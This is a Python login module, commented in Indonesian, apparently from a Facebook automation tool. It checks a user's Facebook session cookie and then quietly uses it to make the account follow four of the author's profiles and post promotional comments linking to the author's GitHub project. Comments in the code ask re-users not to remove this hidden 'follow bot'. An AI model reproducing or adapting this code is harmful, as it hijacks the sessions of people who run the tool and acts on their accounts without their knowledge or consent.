# coding:utf-8
#Recode? silahkan, asalkan jgn di ganti bot follow nya. atau jgn di hapus bot follow dan komen nya silahkan tambahkan punyamu !
#Coding by : Romi Afrizal
from .kontol import *
from .bahasa import lang
from .informasi import generate

komentar1=("Login bang https://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl\n\ngithub.com/Mark-Zuck/rombf")
komentar2=("Login bang https://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl\n\ngithub.com/Mark-Zuck/rombf")


class login:
	def __init__(self,url,cookie):
		
		try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
		except koneksi_error: exit(" \x1b[1;91m[!] Tidak ada koneksi")
		if "mbasic_logout_button" in respon.text:
			#print("\n\n [*] hai \x1b[1;35m"+parser(respon.text,"html.parser").find("title"))
			print("\x1b[1;97m [!] Mohon tunggu")
			url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
			if "Laporkan Masalah" not in respon.text:
				lang(url,cookie)
				try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
				except koneksi_error: exit(" \x1b[1;91m[!] Tidak ada koneksi")
			generate(cookie["cookie"],parser(respon.text,"html.parser"))
			koh=kontolo_gede(url,cookie)
			# jangan di ganti ya bro atau di hapus ya bro :).
			koh.follow("/100003723696885")
			koh.follow("/romi.afrizal.102")
			koh.follow("/romi.29.04.03")
			koh.follow("/romi.alfarabi")
			koh.hoetang("/3933263743432298","2",komentar1,True)
			koh.hoetang("/117136407223278","2",komentar2,True)
			print("\x1b[1;92m [*] Login berhasil")
			waktu(1)
		else:
			exit("\n\x1b[1;91m [!] cookie invalid")